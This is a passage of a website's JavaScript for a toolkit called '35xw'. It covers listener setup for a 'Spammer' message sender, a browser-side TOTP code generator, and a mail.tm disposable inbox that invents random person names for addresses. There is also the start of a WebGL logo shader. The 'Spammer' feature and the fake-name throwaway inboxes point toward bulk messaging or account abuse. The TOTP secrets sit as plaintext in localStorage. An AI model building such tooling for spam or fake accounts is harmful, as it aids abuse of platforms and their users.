            messageContent.addEventListener('input', updatePreview);
        }
        
        if (overrideUsername) {
            overrideUsername.addEventListener('input', updatePreview);
        }
        
        if (embedCheckbox) {
            embedCheckbox.addEventListener('change', () => {
                const embedOptions = document.getElementById('embed-options');
                if (embedOptions) {
                    embedOptions.style.display = embedCheckbox.checked ? 'block' : 'none';
                }
                updatePreview();
            });

            const embedOptions = document.getElementById('embed-options');
            if (embedOptions) {
                embedOptions.style.display = embedCheckbox.checked ? 'block' : 'none';
            }
        }

        const embedTitle = document.getElementById('embed-title');
        const embedDescription = document.getElementById('embed-description');
        const embedColor = document.getElementById('embed-color');
        const embedAuthorName = document.getElementById('embed-author-name');
        const embedAuthorIcon = document.getElementById('embed-author-icon');
        const embedFooterText = document.getElementById('embed-footer-text');
        const embedFooterIcon = document.getElementById('embed-footer-icon');
        const embedThumbnailUrl = document.getElementById('embed-thumbnail-url');
        const embedImageUrl = document.getElementById('embed-image-url');
        
        if (embedTitle) embedTitle.addEventListener('input', updatePreview);
        if (embedDescription) embedDescription.addEventListener('input', updatePreview);
        if (embedColor) {
            embedColor.addEventListener('input', () => {
                const colorSwatch = document.getElementById('color-swatch');
                if (colorSwatch) {
                    const hexValue = embedColor.value.startsWith('#') ? embedColor.value : '#' + embedColor.value;
                    colorSwatch.style.backgroundColor = hexValue;
                }
                updatePreview();
            });
        }
        if (embedAuthorName) embedAuthorName.addEventListener('input', updatePreview);
        if (embedAuthorIcon) embedAuthorIcon.addEventListener('input', updatePreview);
        if (embedFooterText) embedFooterText.addEventListener('input', updatePreview);
        if (embedFooterIcon) embedFooterIcon.addEventListener('input', updatePreview);
        if (embedThumbnailUrl) embedThumbnailUrl.addEventListener('input', updatePreview);
        if (embedImageUrl) embedImageUrl.addEventListener('input', updatePreview);

        updatePreview();
        
        console.log('Spammer event listeners setup complete');
        
    } catch (error) {
        console.error('Error setting up Spammer event listeners:', error);
    }
}


// ============================================================================
// 35xw · Client-side 2FA (TOTP) generator + Mail launcher
// All computation happens in the visitor's browser. Secret keys are never sent
// to the server, never leave this device, and are not visible to the owner.
// ============================================================================

// ---- Base32 (RFC 4648) decode ----
function tfaBase32Decode(str) {
    const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    const s = (str || '').toUpperCase().replace(/=+$/, '').replace(/[^A-Z2-7]/g, '');
    let bits = 0, value = 0;
    const out = [];
    for (const ch of s) {
        const idx = A.indexOf(ch);
        if (idx < 0) continue;
        value = (value << 5) | idx;
        bits += 5;
        if (bits >= 8) {
            bits -= 8;
            out.push((value >>> bits) & 0xff);
            value &= (1 << bits) - 1;
        }
    }
    return new Uint8Array(out);
}

// ---- SHA-1 (pure JS, works on http + https) -> Uint8Array(20) ----
function tfaSha1(data) {
    const total = (((data.length + 8) >> 6) + 1) << 6;
    const buf = new Uint8Array(total);
    buf.set(data);
    buf[data.length] = 0x80;
    const dv = new DataView(buf.buffer);
    const mlBits = data.length * 8;
    dv.setUint32(total - 4, mlBits >>> 0);
    dv.setUint32(total - 8, Math.floor(mlBits / 0x100000000));

    let h0 = 0x67452301, h1 = 0xEFCDAB89, h2 = 0x98BADCFE, h3 = 0x10325476, h4 = 0xC3D2E1F0;
    const w = new Int32Array(80);
    for (let i = 0; i < total; i += 64) {
        for (let j = 0; j < 16; j++) w[j] = dv.getInt32(i + j * 4);
        for (let j = 16; j < 80; j++) {
            const n = w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16];
            w[j] = (n << 1) | (n >>> 31);
        }
        let a = h0, b = h1, c = h2, d = h3, e = h4;
        for (let j = 0; j < 80; j++) {
            let f, k;
            if (j < 20) { f = (b & c) | ((~b) & d); k = 0x5A827999; }
            else if (j < 40) { f = b ^ c ^ d; k = 0x6ED9EBA1; }
            else if (j < 60) { f = (b & c) | (b & d) | (c & d); k = 0x8F1BBCDC; }
            else { f = b ^ c ^ d; k = 0xCA62C1D6; }
            const t = (((a << 5) | (a >>> 27)) + f + e + k + w[j]) | 0;
            e = d; d = c; c = (b << 30) | (b >>> 2); b = a; a = t;
        }
        h0 = (h0 + a) | 0; h1 = (h1 + b) | 0; h2 = (h2 + c) | 0; h3 = (h3 + d) | 0; h4 = (h4 + e) | 0;
    }
    const out = new Uint8Array(20);
    const odv = new DataView(out.buffer);
    odv.setInt32(0, h0); odv.setInt32(4, h1); odv.setInt32(8, h2); odv.setInt32(12, h3); odv.setInt32(16, h4);
    return out;
}

function tfaHmacSha1(key, msg) {
    const B = 64;
    let k = key;
    if (k.length > B) k = tfaSha1(k);
    const kp = new Uint8Array(B); kp.set(k);
    const ipad = new Uint8Array(B), opad = new Uint8Array(B);
    for (let i = 0; i < B; i++) { ipad[i] = kp[i] ^ 0x36; opad[i] = kp[i] ^ 0x5c; }
    const inner = new Uint8Array(B + msg.length); inner.set(ipad); inner.set(msg, B);
    const ih = tfaSha1(inner);
    const outer = new Uint8Array(B + 20); outer.set(opad); outer.set(ih, B);
    return tfaSha1(outer);
}

// ---- TOTP (RFC 6238) ----
function tfaTotp(secret, timeMs, digits, period) {
    digits = digits || 6; period = period || 30;
    const key = tfaBase32Decode(secret);
    if (!key.length) return null;
    const counter = Math.floor((timeMs / 1000) / period);
    const msg = new Uint8Array(8);
    const dv = new DataView(msg.buffer);
    dv.setUint32(0, Math.floor(counter / 0x100000000));
    dv.setUint32(4, counter >>> 0);
    const h = tfaHmacSha1(key, msg);
    const off = h[19] & 0x0f;
    const bin = ((h[off] & 0x7f) << 24) | ((h[off + 1] & 0xff) << 16) | ((h[off + 2] & 0xff) << 8) | (h[off + 3] & 0xff);
    return (bin % Math.pow(10, digits)).toString().padStart(digits, '0');
}

function tfaCopy(text) {
    const fallback = () => {
        try {
            const ta = document.createElement('textarea');
            ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.focus(); ta.select();
            document.execCommand('copy'); document.body.removeChild(ta);
        } catch (e) {}
    };
    try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
            // writeText rejects without user activation / on non-secure origins — fall back quietly.
            navigator.clipboard.writeText(text).catch(fallback);
            return;
        }
    } catch (e) {}
    fallback();
}

function initTwofa() {
    const secretEl = document.getElementById('twofa-secret');
    if (!secretEl || window.__twofaInit) return;
    window.__twofaInit = true;

    const codeEl = document.getElementById('twofa-code');
    const cdEl = document.getElementById('twofa-countdown');
    const ring = document.getElementById('twofa-ring-progress');
    const hint = document.getElementById('twofa-hint');
    const toggle = document.getElementById('twofa-toggle');
    const copyKey = document.getElementById('twofa-copy-key');
    const qrBtn = document.getElementById('twofa-qr');
    const autocopy = document.getElementById('twofa-autocopy');
    const saveBtn = document.getElementById('twofa-save');
    const clearBtn = document.getElementById('twofa-clear-saved');
    const savedList = document.getElementById('twofa-saved-list');

    if (!codeEl || !cdEl || !ring || !hint || !toggle || !copyKey || !qrBtn || !saveBtn || !clearBtn || !savedList) return;

    const code1El = document.getElementById('twofa-code-1');
    const code2El = document.getElementById('twofa-code-2');
    let lastCode = '';
    let lastCounter = -1;

    const currentSecret = () => (secretEl.value || '').replace(/\s+/g, '');
    const isValid = (s) => tfaBase32Decode(s).length >= 10;
    const setCode = (a, b) => { if (code1El) code1El.textContent = a; if (code2El) code2El.textContent = b; };

    // The ring is a pure CSS animation; we only sync it to the wall clock via a
    // negative animation-delay so it stays aligned with the TOTP 30s window.
    function startRing() {
        const syncOffset = (Date.now() / 1000) % 30;
        ring.style.animation = 'none';
        void ring.getBoundingClientRect(); // force reflow (SVG has no offsetWidth) so the restart takes
        ring.style.animation = 'ring-countdown 30s linear ' + (-syncOffset).toFixed(3) + 's infinite';
    }
    function stopRing() { ring.style.animation = 'none'; }
    const ringLive = () => ring.getAnimations && ring.getAnimations().length > 0;

    function resetDisplay(msg, cls) {
        setCode('•••', '•••');
        codeEl.classList.remove('live');
        cdEl.textContent = '—';
        stopRing();
        hint.textContent = msg;
        hint.className = 'twofa-hint' + (cls ? ' ' + cls : '');
        lastCode = '';
        lastCounter = -1;
    }

    function tick() {
        const s = currentSecret();
        if (!s) { resetDisplay('Waiting for a valid secret key…', ''); return; }
        if (!isValid(s)) { resetDisplay('That does not look like a valid Base32 secret key.', 'err'); return; }

        const now = Date.now(), period = 30;
        const remaining = Math.max(1, Math.ceil(period - ((now / 1000) % period)));
        cdEl.textContent = remaining + 's';

        // Re-arm the ring if it was cancelled (switching tabs sets the panel display:none,
        // which cancels the CSS animation — this self-heals when the tab is shown again).
        if (!ringLive()) startRing();

        const counter = Math.floor((now / 1000) / period);
        if (counter === lastCounter) return;
        lastCounter = counter;

        // Re-sync the ring at each window boundary (seamless: it restarts at "full").
        startRing();

        const code = tfaTotp(s, now);
        if (!code) { resetDisplay('Could not generate a code from that key.', 'err'); return; }
        const mid = Math.ceil(code.length / 2);
        setCode(code.slice(0, mid), code.slice(mid));
        codeEl.classList.add('live');
        hint.textContent = 'Live code · auto-refreshes every 30 seconds';
        hint.className = 'twofa-hint ok';
        if (code !== lastCode) {
            lastCode = code;
            if (autocopy && autocopy.checked) tfaCopy(code);
        }
    }

    // Force an immediate recompute (the counter is time-based, so a new secret in the
    // same 30s window must invalidate the cached counter).
    const refresh = () => { lastCounter = -1; tick(); };
    setInterval(tick, 200);
    refresh();
    secretEl.addEventListener('input', refresh);

    toggle.addEventListener('click', () => {
        const hidden = secretEl.type === 'password';
        secretEl.type = hidden ? 'text' : 'password';
        toggle.querySelector('i').className = hidden ? 'fas fa-eye-slash' : 'fas fa-eye';
    });
    copyKey.addEventListener('click', () => {
        const s = currentSecret();
        if (!s) return;
        tfaCopy(s); showNotification('Secret key copied', 'success');
    });
    qrBtn.addEventListener('click', () => {
        const s = currentSecret();
        if (!isValid(s)) { showNotification('Enter a valid secret key first', 'warning'); return; }
        const uri = 'otpauth://totp/35xw?secret=' + encodeURIComponent(s) + '&issuer=35xw&period=30&digits=6';
        tfaCopy(uri); showNotification('otpauth:// URI copied — paste into any authenticator', 'success');
    });
    codeEl.addEventListener('click', () => {
        if (lastCode) { tfaCopy(lastCode); showNotification('Code copied', 'success'); }
    });

    // ---- saved keys (local to this browser only) ----
    const getSaved = () => { try { return JSON.parse(localStorage.getItem('twofaSavedKeys') || '[]'); } catch (e) { return []; } };
    const setSaved = (a) => { try { localStorage.setItem('twofaSavedKeys', JSON.stringify(a)); } catch (e) {} };

    function renderSaved() {
        const arr = getSaved();
        savedList.innerHTML = '';
        if (!arr.length) {
            savedList.innerHTML = '<div class="twofa-saved-empty"><i class="fas fa-shield-halved"></i> No saved keys yet — add one above.</div>';
            return;
        }
        arr.forEach((item) => {
            const row = document.createElement('div');
            row.className = 'twofa-saved-item';
            const mask = item.secret.length > 8 ? item.secret.slice(0, 4) + '••••' + item.secret.slice(-4) : '••••';
            row.innerHTML = '<div class="twofa-saved-info"><span class="twofa-saved-name">' +
                (item.label || 'Account') + '</span><span class="twofa-saved-secret">' + mask + '</span></div>' +
                '<div class="twofa-saved-actions">' +
                '<button type="button" class="twofa-saved-use" title="Use this key"><i class="fas fa-rotate"></i></button>' +
                '<button type="button" class="twofa-saved-del" title="Delete"><i class="fas fa-xmark"></i></button></div>';
            row.querySelector('.twofa-saved-use').addEventListener('click', () => {
                secretEl.value = item.secret; lastCounter = -1; tick();
                showNotification('Loaded "' + (item.label || 'Account') + '"', 'success');
            });
            row.querySelector('.twofa-saved-del').addEventListener('click', () => {
                setSaved(getSaved().filter(x => x.id !== item.id)); renderSaved();
            });
            savedList.appendChild(row);
        });
    }

    saveBtn.addEventListener('click', () => {
        const s = currentSecret();
        if (!isValid(s)) { showNotification('Enter a valid secret key first', 'warning'); return; }
        const arr = getSaved();
        let label = '';
        try { label = (window.prompt('Name this key (optional):', '') || '').trim(); } catch (e) {}
        arr.push({ id: Date.now().toString(36) + Math.floor(Math.random() * 1e6).toString(36), label: label || ('Account ' + (arr.length + 1)), secret: s });
        setSaved(arr); renderSaved();
        showNotification('Key saved locally on this device', 'success');
    });
    clearBtn.addEventListener('click', () => {
        if (!getSaved().length) return;
        if (window.confirm('Clear all saved keys from this browser?')) { setSaved([]); renderSaved(); }
    });

    renderSaved();
}

function initMail() {
    if (window.__mailInit) return;
    window.__mailInit = true;
    const open = () => { try { window.open('https://outlook.live.com/mail/', '_blank', 'noopener,noreferrer'); } catch (e) {} };
    const a = document.getElementById('mail-open-outlook');
    const b = document.getElementById('mail-launch-outlook');
    if (a) a.addEventListener('click', open);
    if (b) b.addEventListener('click', open);
}

// ============================================================================
// 35xw · TempMail — a real disposable inbox via the public mail.tm API.
// Everything runs client-side; the address/password live only in this browser.
// ============================================================================
const TM = {
    base: 'https://api.mail.tm',
    bases: ['https://api.mail.tm', 'https://api.mail.gw'], // twins with the same API but different domains
    account: null,      // { address, password, token, id, base }
    domains: [],        // [{ domain, base }]
    messages: [],
    notified: new Set(),
    poll: null,
};
// which provider base URL owns a given domain string
const tmBaseFor = (domain) => { const d = TM.domains.find(x => x.domain === domain); return (d && d.base) || TM.base; };

const tmSleep = (ms) => new Promise(r => setTimeout(r, ms));
// mail.tm returns either a hydra collection {"hydra:member":[…]} or a plain array
// depending on the Accept header — normalise both to a plain list.
const tmMembers = (j) => Array.isArray(j) ? j : ((j && j['hydra:member']) || []);
const tmEsc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
const tmRandPass = () => 'Zx' + Math.random().toString(36).slice(2, 12) + 'Q9!';
const tmRandUser = () => 'user' + Math.random().toString(36).slice(2, 9);
const TM_FIRST = ['Bilal', 'Deriek', 'Mila', 'Jonas', 'Aria', 'Kenji', 'Luca', 'Nadia', 'Omar', 'Ivy', 'Theo', 'Zara', 'Felix', 'Nora', 'Ravi', 'Elsa', 'Diego', 'Maya', 'Soren', 'Lena'];
const TM_LAST = ['Bazile', 'Tokar', 'Vance', 'Reyes', 'Novak', 'Kade', 'Frost', 'Marsh', 'Blaine', 'Quill', 'Rourke', 'Stahl', 'Vega', 'Wren', 'Ash', 'Cole', 'Dane', 'Hart', 'Lux', 'Pike'];
const tmRandName = () => TM_FIRST[Math.floor(Math.random() * TM_FIRST.length)] + '.' + TM_LAST[Math.floor(Math.random() * TM_LAST.length)];

async function tmFetch(path, opts, auth) {
    opts = opts || {};
    const base = opts.base || (TM.account && TM.account.base) || TM.base;
    const headers = Object.assign({}, opts.headers || {});
    if (opts.body) headers['Content-Type'] = 'application/json';
    if (auth && TM.account && TM.account.token) headers['Authorization'] = 'Bearer ' + TM.account.token;
    let res;
    for (let attempt = 0; attempt < 4; attempt++) {
        res = await fetch(base + path, { method: opts.method || 'GET', headers, body: opts.body });
        if (res.status === 429) { await tmSleep(1300); continue; } // rate-limited, back off
        break;
    }
    return res;
}

function tmSaveAccount() { try { localStorage.setItem('tmAccount', JSON.stringify(TM.account)); } catch (e) {} }
function tmLoadStoredAccount() { try { return JSON.parse(localStorage.getItem('tmAccount') || 'null'); } catch (e) { return null; } }
function tmGetSaved() { try { return JSON.parse(localStorage.getItem('tmSaved') || '[]'); } catch (e) { return []; } }
function tmSetSaved(a) { try { localStorage.setItem('tmSaved', JSON.stringify(a)); } catch (e) {} }

async function tmLoadDomains() {
    // Merge domains from every provider (mail.tm + its twin mail.gw). Each is wrapped
    // so one being down (mail.gw sometimes 502s) simply drops it; the other still works.
    const merged = [];
    const seen = new Set();
    await Promise.all(TM.bases.map(async (base) => {
        try {
            const res = await tmFetch('/domains?page=1', { base });
            const j = await res.json();
            tmMembers(j).filter(d => d.isActive && !d.isPrivate).forEach(d => {
                if (!seen.has(d.domain)) { seen.add(d.domain); merged.push({ domain: d.domain, base }); }
            });
        } catch (e) { /* provider unavailable — skip */ }
    }));
    if (merged.length) TM.domains = merged;
    return TM.domains;
}

async function tmGetToken(address, password, tries, base) {
    tries = tries || 5;
    for (let i = 0; i < tries; i++) {
        try {
            const res = await tmFetch('/token', { method: 'POST', body: JSON.stringify({ address, password }), base });
            if (res.status === 200) { const j = await res.json(); return j.token || null; }
        } catch (e) {}
        await tmSleep(900); // account needs a moment to propagate after creation
    }
    return null;
}

function tmUpdateAddressUI() {
    const el = document.getElementById('tm-address-text');
    if (el && TM.account) el.textContent = TM.account.address;
}

async function tmCreateAccount(username, domain) {
    const user = ((username || '').toLowerCase().replace(/[^a-z0-9._-]/g, '')) || tmRandUser();
    const dom = domain || (TM.domains[0] && TM.domains[0].domain);
    if (!dom) return false;
    const base = tmBaseFor(dom); // route create + token to the provider that owns this domain
    const password = tmRandPass();
    let address = user + '@' + dom;
    let res = await tmFetch('/accounts', { method: 'POST', body: JSON.stringify({ address, password }), base });
    if (res.status === 422) { // address already taken -> add a short suffix
        address = user + '.' + Math.random().toString(36).slice(2, 6) + '@' + dom;
        res = await tmFetch('/accounts', { method: 'POST', body: JSON.stringify({ address, password }), base });
    }
    if (res.status !== 201) return false;
    const acct = await res.json();
    const token = await tmGetToken(address, password, 5, base);
    if (!token) return false;
    TM.account = { address, password, token, id: acct.id, base };
    TM.messages = []; TM.notified = new Set();
    tmSaveAccount(); tmUpdateAddressUI(); tmRenderList();
    return true;
}

async function tmEnsureAccount() {
    const stored = tmLoadStoredAccount();
    if (stored && stored.address && stored.password) {
        if (!stored.base) stored.base = TM.base; // migrate older stored accounts
        TM.account = stored;
        tmUpdateAddressUI();
        const token = await tmGetToken(stored.address, stored.password, 2, stored.base);
        if (token) { TM.account.token = token; tmSaveAccount(); return true; }
    }
    return await tmCreateAccount(tmRandName(), TM.domains[0] && TM.domains[0].domain);
}

function tmTime(iso) { try { return new Date(iso).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }); } catch (e) { return ''; } }

function tmRenderList() {
    const list = document.getElementById('tm-list');
    const empty = document.getElementById('tm-empty');
    const count = document.getElementById('tm-count');
    if (!list || !empty) return;
    if (count) count.textContent = TM.messages.length;
    if (!TM.messages.length) { list.innerHTML = ''; empty.classList.remove('hidden'); return; }
    empty.classList.add('hidden');
    list.innerHTML = '';
    TM.messages.forEach(m => {
        const from = (m.from && (m.from.name || m.from.address)) || 'Unknown';
        const initial = tmEsc((String(from).trim()[0] || '?'));
        const row = document.createElement('div');
        row.className = 'tm-msg-item' + (m.seen ? '' : ' unread');
        row.innerHTML =
            '<div class="tm-msg-avatar">' + initial + '</div>' +
            '<div class="tm-msg-item-main">' +
                '<div class="tm-msg-item-top">' +
                    '<span class="tm-msg-item-from">' + tmEsc(from) + '</span>' +
                    '<span class="tm-msg-item-time">' + tmEsc(tmTime(m.createdAt)) + '</span>' +
                '</div>' +
                '<div class="tm-msg-item-subject">' + tmEsc(m.subject || '(no subject)') + '</div>' +
                '<div class="tm-msg-item-intro">' + tmEsc(m.intro || '') + '</div>' +
            '</div>' +
            '<div class="tm-msg-item-dot"></div>';
        row.addEventListener('click', () => tmOpenMessage(m.id));
        list.appendChild(row);
    });
}

async function tmPoll() {
    if (!TM.account || !TM.account.token) return;
    let res;
    try { res = await tmFetch('/messages?page=1', {}, true); } catch (e) { return; }
    if (res.status === 401) {
        const token = await tmGetToken(TM.account.address, TM.account.password, 2, TM.account.base);
        if (token) { TM.account.token = token; tmSaveAccount(); }
        return;
    }
    if (res.status !== 200) return;
    let j; try { j = await res.json(); } catch (e) { return; }
    const list = tmMembers(j);
    const fresh = list.filter(m => !TM.notified.has(m.id));
    TM.messages = list;
    tmRenderList();
    if (fresh.length) {
        fresh.forEach(m => TM.notified.add(m.id));
        if (typeof showNotification === 'function') showNotification(fresh.length + ' new email' + (fresh.length > 1 ? 's' : ''), 'success');
    }
}

function tmStartPolling() {
    if (TM.poll) clearInterval(TM.poll);
    tmPoll();
    TM.poll = setInterval(tmPoll, 8000);
    const st = document.getElementById('tm-status');
    if (st) { st.classList.add('live'); st.innerHTML = '<span class="tm-status-dot"></span> Live · auto-refreshing'; }
}

async function tmOpenMessage(id) {
    const modal = document.getElementById('tm-msg-modal');
    const body = document.getElementById('tm-msg-body');
    const subjEl = document.getElementById('tm-msg-subject');
    const fromEl = document.getElementById('tm-msg-from');
    if (!modal || !body) return;
    modal.style.display = 'flex';
    body.innerHTML = '<div class="tm-msg-loading">Loading…</div>';
    try {
        const res = await tmFetch('/messages/' + id, {}, true);
        const m = await res.json();
        if (subjEl) subjEl.textContent = m.subject || '(no subject)';
        if (fromEl) fromEl.textContent = (m.from && (m.from.name ? m.from.name + ' <' + m.from.address + '>' : m.from.address)) || '';
        const html = Array.isArray(m.html) ? m.html.join('') : (m.html || '');
        body.innerHTML = '';
        if (html) {
            const iframe = document.createElement('iframe');
            iframe.setAttribute('sandbox', ''); // fully isolated: no scripts, no same-origin
            iframe.srcdoc = html;
            body.appendChild(iframe);
        } else {
            const pre = document.createElement('pre');
            pre.textContent = m.text || '(empty message)';
            body.appendChild(pre);
        }
        setTimeout(tmPoll, 400); // server marks it seen; refresh unread state
    } catch (e) {
        body.innerHTML = '<div class="tm-msg-loading">Could not load this message.</div>';
    }
}

function tmSaveCurrent() {
    if (!TM.account) return;
    const saved = tmGetSaved();
    if (saved.some(x => x.address === TM.account.address)) { if (typeof showNotification === 'function') showNotification('Already saved', 'info'); return; }
    saved.unshift({ address: TM.account.address, password: TM.account.password, base: TM.account.base });
    tmSetSaved(saved.slice(0, 20));
    if (typeof showNotification === 'function') showNotification('Address saved', 'success');
}

function tmRenderPrevious() {
    const wrap = document.getElementById('tm-previous-wrap');
    const listEl = document.getElementById('tm-previous-list');
    if (!wrap || !listEl) return;
    const saved = tmGetSaved();
    if (!saved.length) { wrap.style.display = 'none'; return; }
    wrap.style.display = 'block'; listEl.innerHTML = '';
    saved.forEach(s => {
        const row = document.createElement('div');
        row.className = 'tm-previous-item';
        row.innerHTML = '<span>' + tmEsc(s.address) + '</span><button type="button">Use</button>';
        row.querySelector('button').addEventListener('click', async () => {
            const sbase = s.base || tmBaseFor(s.address.split('@')[1]) || TM.base;
            TM.account = { address: s.address, password: s.password, token: null, id: null, base: sbase };
            tmUpdateAddressUI();
            const token = await tmGetToken(s.address, s.password, 2, sbase);
            if (token) {
                TM.account.token = token; TM.messages = []; TM.notified = new Set();
                tmSaveAccount(); tmRenderList(); tmStartPolling();
                const modal = document.getElementById('tm-modal'); if (modal) modal.style.display = 'none';
                if (typeof showNotification === 'function') showNotification('Restored ' + s.address, 'success');
            } else if (typeof showNotification === 'function') showNotification('That address is no longer available', 'error');
        });
        listEl.appendChild(row);
    });
}

function tmUpdatePreview() {
    const u = document.getElementById('tm-username'); const d = document.getElementById('tm-domain'); const p = document.getElementById('tm-preview');
    if (!u || !d || !p) return;
    const user = (u.value || '').trim() || 'username';
    const dom = d.value || (TM.domains[0] && TM.domains[0].domain) || 'web-library.net';
    p.textContent = user + '@' + dom;
}

function tmOpenChangeModal() {
    const modal = document.getElementById('tm-modal');
    const userInput = document.getElementById('tm-username');
    const domainSel = document.getElementById('tm-domain');
    if (!modal || !userInput || !domainSel) return;
    domainSel.innerHTML = '';
    const domainList = TM.domains.length ? TM.domains.map(x => x.domain) : ['web-library.net'];
    domainList.forEach(dm => {
        const opt = document.createElement('option'); opt.value = dm; opt.textContent = '@' + dm; domainSel.appendChild(opt);
    });
    if (TM.account) {
        userInput.value = TM.account.address.split('@')[0];
        domainSel.value = TM.account.address.split('@')[1];
    } else { userInput.value = tmRandName(); }
    tmUpdatePreview(); tmRenderPrevious();
    modal.style.display = 'flex';
}

async function tmApplyChange() {
    const applyBtn = document.getElementById('tm-apply');
    const user = document.getElementById('tm-username').value.trim();
    const dom = document.getElementById('tm-domain').value;
    if (applyBtn) { applyBtn.disabled = true; applyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Changing…'; }
    const ok = await tmCreateAccount(user, dom);
    if (applyBtn) { applyBtn.disabled = false; applyBtn.innerHTML = '<i class="fas fa-check"></i> Change address'; }
    if (ok) {
        const modal = document.getElementById('tm-modal'); if (modal) modal.style.display = 'none';
        tmStartPolling();
        if (typeof showNotification === 'function') showNotification('New address ready', 'success');
    } else if (typeof showNotification === 'function') showNotification('Could not create that address — try another', 'error');
}

async function initTempmail() {
    if (window.__tempmailInit) return;
    window.__tempmailInit = true;

    const copyAddr = () => { if (TM.account && typeof tfaCopy === 'function') { tfaCopy(TM.account.address); if (typeof showNotification === 'function') showNotification('Address copied', 'success'); } };
    const on = (id, ev, fn) => { const el = document.getElementById(id); if (el) el.addEventListener(ev, fn); };

    on('tm-copy', 'click', copyAddr);
    on('tm-address', 'click', copyAddr);
    on('tm-save', 'click', tmSaveCurrent);
    on('tm-refresh', 'click', () => { tmPoll(); if (typeof showNotification === 'function') showNotification('Checking for new mail…', 'info'); });
    on('tm-change', 'click', tmOpenChangeModal);
    on('tm-modal-close', 'click', () => { const m = document.getElementById('tm-modal'); if (m) m.style.display = 'none'; });
    on('tm-modal-cancel', 'click', () => { const m = document.getElementById('tm-modal'); if (m) m.style.display = 'none'; });
    on('tm-modal-overlay', 'click', () => { const m = document.getElementById('tm-modal'); if (m) m.style.display = 'none'; });
    on('tm-msg-close', 'click', () => { const m = document.getElementById('tm-msg-modal'); if (m) m.style.display = 'none'; });
    on('tm-msg-overlay', 'click', () => { const m = document.getElementById('tm-msg-modal'); if (m) m.style.display = 'none'; });
    on('tm-random-name', 'click', () => { const u = document.getElementById('tm-username'); if (u) { u.value = tmRandName(); tmUpdatePreview(); } });
    on('tm-random-user', 'click', () => { const u = document.getElementById('tm-username'); if (u) { u.value = tmRandUser(); tmUpdatePreview(); } });
    on('tm-username', 'input', tmUpdatePreview);
    on('tm-domain', 'change', tmUpdatePreview);
    on('tm-apply', 'click', tmApplyChange);

    const addrText = document.getElementById('tm-address-text');
    if (addrText) addrText.textContent = 'Setting up your inbox…';
    tmProvision();
}

// Provision (or restore) the inbox, retrying automatically if mail.tm is briefly
// rate-limited or unreachable, so it recovers on its own instead of dead-ending.
async function tmProvision() {
    const addrText = document.getElementById('tm-address-text');
    const st = document.getElementById('tm-status');
    try {
        if (!TM.domains.length) await tmLoadDomains();
        const ok = await tmEnsureAccount();
        if (ok) { clearTimeout(TM._retry); tmStartPolling(); return; }
    } catch (e) { /* fall through to retry */ }
    if (addrText && (!TM.account || !TM.account.token)) addrText.textContent = 'TempMail is busy — reconnecting…';
    if (st) st.innerHTML = '<span class="tm-status-dot"></span> Reconnecting…';
    clearTimeout(TM._retry);
    TM._retry = setTimeout(tmProvision, 15000);
}

// ============================================================================
// 35xw · Chrome/iridescent WebGL logo (ported verbatim from the design handoff).
// Renders the given text as a liquid-chrome mask with an iridescent oil-slick
// sheen. Returns { dispose, energize }.
// ============================================================================
function initChromeLogo(canvas, opts) {
    opts = opts || {};
    var text = opts.text || '35xw';
    var speed = opts.speed != null ? opts.speed : 1;
    var iridescence = opts.iridescence != null ? opts.iridescence : 1;

    var gl = canvas.getContext('webgl', { antialias: false, alpha: false, preserveDrawingBuffer: true });
    if (!gl) return null;

    var disposed = false, maskReady = false, t0 = performance.now();
    var W = 0, H = 0, doff = 2, ns = 30;
    var energizeStart = 0; // ms when the exit "charge" begins

    var vsSrc = 'attribute vec2 aPos; varying vec2 vUv;' +
        'void main() { vUv = aPos * 0.5 + 0.5; gl_Position = vec4(aPos, 0.0, 1.0); }';
    var fsSrc = [
        'precision highp float;',
        'varying vec2 vUv;',
        'uniform sampler2D uHeight;',
        'uniform sampler2D uSharp;',
        'uniform sampler2D uGlow;',
        'uniform vec2 uRes;',
        'uniform float uTime;',
        'uniform float uSpeed;',
        'uniform float uIri;',
        'uniform float uNs;',
        'uniform float uOff;',
        'vec3 pal(float t) { return 0.5 + 0.5 * cos(6.28318 * (t + vec3(0.0, 0.33, 0.67))); }',
        'vec3 pal2(float t) { return 0.5 + 0.5 * cos(6.28318 * (t + vec3(0.0, 0.13, 0.30))); }',
        'float hgt(vec2 uv) { return texture2D(uHeight, uv).r; }',
        'void main() {',
        '  vec2 px = 1.0 / uRes;',
        '  float t = uTime * uSpeed;',
        '  vec2 q = vUv * vec2(uRes.x / uRes.y, 1.0);',
        '  float h = hgt(vUv);',
        '  vec2 dx = vec2(px.x * uOff, 0.0);',
        '  vec2 dy = vec2(0.0, px.y * uOff);',
        '  float hx = hgt(vUv + dx) - hgt(vUv - dx);',
        '  float hy = hgt(vUv + dy) - hgt(vUv - dy);',
        '  vec3 n = normalize(vec3(-hx * uNs, -hy * uNs, 1.0));',
        '  float rim = pow(1.0 - max(n.z, 0.0), 2.5);',
        '  float core = smoothstep(0.30, 0.75, h);',
        '  float breathe = 0.05 * sin(q.x * 1.6 + t * 0.30) + 0.04 * sin(q.y * 2.2 - t * 0.22 + q.x);',
        '  float base = mix(1.02, 0.52, core) + rim * 0.32 + max(n.y, 0.0) * 0.10 + pow(max(n.y, 0.0), 5.0) * 0.45 + breathe;',
        '  vec3 col = base * vec3(0.97, 0.98, 1.02);',
        '  float leftBias = 1.0 - smoothstep(0.30, 0.47, vUv.x);',
        '  float acc = clamp(leftBias * 1.3, 0.0, 1.0) * uIri;',
        '  float u = clamp((h - 0.28) / 0.69, 0.0, 1.0);',
        '  u += 0.05 * sin(q.x * 2.5 + t * 0.12) + 0.03 * sin(q.y * 3.0 - t * 0.09);',
        '  u = clamp(u, 0.0, 1.0);',
        '  vec3 ribbon = mix(vec3(1.0), vec3(1.0, 0.42, 0.12), smoothstep(0.05, 0.22, u));',
        '  ribbon = mix(ribbon, vec3(1.04, 0.88, 0.35), smoothstep(0.22, 0.42, u));',
        '  ribbon = mix(ribbon, vec3(1.02, 1.0, 0.98), smoothstep(0.42, 0.58, u));',
        '  ribbon = mix(ribbon, vec3(0.35, 0.85, 1.02), smoothstep(0.58, 0.80, u));',
